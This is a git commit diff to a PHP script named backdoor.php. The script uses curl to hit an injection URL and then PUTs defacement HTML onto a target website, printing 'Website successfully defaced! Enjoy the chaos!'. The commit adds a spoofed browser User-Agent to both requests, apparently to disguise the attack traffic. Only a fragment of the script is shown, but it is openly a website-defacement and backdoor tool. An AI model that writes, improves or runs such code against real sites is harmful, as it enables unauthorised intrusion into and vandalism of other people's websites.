75119114bd5128166a7c3049366de435e7d48bce
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-31 03:01:14 -0800

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -11,6 +11,7 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $injectionUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"); 
 $response = curl_exec($ch);
 curl_close($ch);
 
@@ -20,8 +21,9 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
 curl_setopt($ch, CURLOPT_POSTFIELDS, $defaceHtml);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"); 
 $response = curl_exec($ch);
 curl_close($ch);
 
 echo "Website successfully defaced! Enjoy the chaos!";
-?> 
+?>
